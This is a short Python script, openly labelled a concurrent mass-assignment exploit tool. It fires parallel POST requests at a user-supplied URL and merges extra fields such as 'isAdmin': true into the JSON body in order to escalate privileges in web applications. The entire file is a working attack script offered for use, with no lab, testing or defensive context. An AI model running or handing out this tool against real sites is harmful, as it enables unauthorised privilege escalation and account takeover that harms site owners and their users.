import json
import asyncio
import aiohttp
import argparse

async def exploit_mass_assignment(session, url, data, exploit_data):
    # Merge the user's data and the exploit data
    payload = {**data, **exploit_data}
    
    async with session.post(url, json=payload) as response:
        return await response.text()

async def main():
    parser = argparse.ArgumentParser(description="Concurrent Mass Assignment Exploit Tool")
    parser.add_argument("-u", "--url", required=True, help="URL endpoint to exploit")
    parser.add_argument("-d", "--data", type=json.loads, required=True, help="Original data in JSON format. Example: '{\"username\":\"user\",\"password\":\"pass\"}'")
    parser.add_argument("-e", "--exploit", type=json.loads, required=True, help="Exploit data in JSON format. Example: '{\"isAdmin\":true}'")
    parser.add_argument("-c", "--concurrent", type=int, default=1, help="Number of concurrent requests")

    args = parser.parse_args()

    async with aiohttp.ClientSession() as session:
        tasks = [exploit_mass_assignment(session, args.url, args.data, args.exploit) for _ in range(args.concurrent)]
        responses = await asyncio.gather(*tasks)
        
        for response in responses:
            print(response)

if __name__ == "__main__":
    asyncio.run(main())
